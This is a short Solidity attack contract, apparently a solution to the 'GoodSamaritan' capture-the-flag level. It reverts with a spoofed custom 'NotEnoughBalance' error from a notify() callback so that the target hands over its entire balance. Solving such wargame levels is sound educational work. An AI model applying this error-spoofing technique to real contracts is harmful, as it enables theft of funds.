// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../levels/GoodSamaritan.sol";

contract GoodSamaritanAttack is INotifyable{
    GoodSamaritan public immutable goodSamaritan;
    constructor(address _goodSamaritan){
        goodSamaritan = GoodSamaritan(_goodSamaritan);
    }
    error NotEnoughBalance();
    error NotAuth();
    function notify(uint256 amount) external{
        require(msg.sender == address(goodSamaritan.coin()), NotAuth());
        if (amount == 10){
            revert NotEnoughBalance();
        }
    }
    function attack() external{
        goodSamaritan.requestDonation();
    }
}
